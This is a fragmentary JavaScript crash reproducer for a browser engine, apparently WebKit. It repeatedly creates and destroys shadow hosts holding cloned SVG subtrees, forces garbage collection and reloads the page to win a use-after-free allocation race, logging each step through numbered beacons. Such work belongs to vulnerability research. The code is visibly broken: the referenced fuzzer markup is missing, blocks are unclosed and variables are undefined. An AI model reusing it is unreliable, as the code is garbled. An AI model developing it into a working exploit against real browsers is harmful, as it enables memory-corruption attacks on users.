<script>

// The markup below is the authentic fuzzer case, byte for byte; only the script is ours.

// the whole run. v2 removes the shadow host - destroying the shadow root and its scope
// while the RenderStyle cycle keeps the SVG alive - then repeats, because a single teardown
// may simply never win the allocation race.
//
// Every beacon is numbered, because POSTs arrive interleaved and the log order is not the
// execution order.
var N = 0;
function beacon(tag) {
    try {
        var u = '/beacon/' + (++N) + '-' + encodeURIComponent(tag);
        if (navigator.sendBeacon) navigator.sendBeacon(u, '');
        else { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(); }
    } catch (e) {}
    try { document.title = N + ' ' + tag; } catch (e) {}
}

window.onerror = function (m, s, l) { beacon('ERROR:' + m + '@' + l); return true; };

function gc() {
    if (window.GCController) { GCController.collect(); return; }
    for (var i = 0; i < 100; i++) { new Uint8Array(1024 * 1024); }
}

    beacon('X5=' + (typeof x5) + '/' + (x5 ? x5.namespaceURI : 'null'));
    beacon('X11=' + (typeof x11) + '/' + (x11 ? x11.namespaceURI : 'null'));

    var v63;
    try {

        beacon('THREW-ATTACH:' + e.name);

    try { x18.scrollTop; } catch (e) { beacon('THREW-SCROLL:' + e.name); }

    try {

        beacon('AFTER-APPEND');
    } catch (e) {

    gc();
    beacon('AFTER-GC');

    // The step v1 was missing: destroy the shadow root, and with it the Style::Scope, while
    // the SVG's RenderStyle still references an element in the tree.
    beacon('BEFORE-REMOVE-HOST');
    try {
        x5.remove();
        beacon('AFTER-REMOVE-HOST');
    } catch (e) {
        beacon('THREW-REMOVE:' + e.name);
    }
    gc();
    beacon('AFTER-GC2');

    // Repeat the cycle. Cloning the parsed subtree reproduces exactly the shape the parser
    // produced (breakout, duplicate ids and all) without re-parsing.
    var proto = v63.firstChild;
    var i;
    for (i = 1; i <= 60; i++) {
        var host, sr, svg;
        try {
            host = document.createElement('blockquote');
            sr = host.attachShadow({ mode: 'open', delegatesFocus: false });
            svg = proto.cloneNode(true);
            sr.appendChild(svg);

            beacon('B' + i);

        try {
            host.remove();
            beacon('R' + i);
        } catch (e) {
            beacon('THREW-REMOVE2:' + e.name + '@' + i);

    gc();
    beacon('Z-SURVIVED');

    var n = 0;

    n++;

    // Keep 24 live hosts across a GC first: a host that is still referenced cannot be

    }
    gc();
    beacon('KEEP-GC');
    keep.length = 0;
    gc();
    beacon('KEEP-DROPPED');

    setTimeout(function () {
        beacon('RELOADING');
        location.reload();
    }, 250);
}
</script>
